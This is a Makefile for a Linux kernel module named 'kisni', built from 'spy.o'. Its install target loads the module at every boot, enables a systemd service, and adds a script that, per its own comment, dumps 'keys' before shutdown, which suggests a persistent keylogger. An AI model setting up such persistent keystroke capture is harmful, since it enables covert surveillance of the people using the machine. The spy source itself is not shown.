modname := kisni
obj-m := $(modname).o

kisni-objs := spy.o

KVERSION = $(shell uname -r)
KDIR := /lib/modules/$(KVERSION)/build

ifdef DEBUG
CFLAGS_$(obj-m) := -DDEBUG
endif

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

load:
	-rmmod $(modname)
	insmod $(modname).ko

unload:
	-rmmod $(modname)

install:
	mkdir -p /lib/modules/$(KVERSION)/misc/$(modname)
	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/misc/$(modname)
	depmod -a
	#install systemd service unit
	cp kdesni.service /lib/systemd/system/kdesni.service
	systemctl daemon-reload
	systemctl enable kdesni.service
	#copy script to dump keys from /sys/kernel/debug/kisni/keys file before shoutdown/reboot
	mkdir -p /opt/kdesni
	cp dump.sh /opt/kdesni/dump.sh
	chmod +x /opt/kdesni/dump.sh
	echo kisni >> /etc/modules-load.d/modules.conf
	

uninstall:
	rm /lib/modules/$(KVERSION)/misc/$(modname)/$(modname).ko
	rmdir /lib/modules/$(KVERSION)/misc/$(modname)
	rmdir /lib/modules/$(KVERSION)/misc
	depmod -a
	systemctl disable kdesni.service
	rm /opt/kdesni/dump.sh
	rmdir -r /opt/kdesni/
	rm /lib/systemd/system/kdesni.service
	echo ""
	echo "Files and modules removed. You may need to remove module name from file '/etc/modules-load.d/modules.conf' manually"
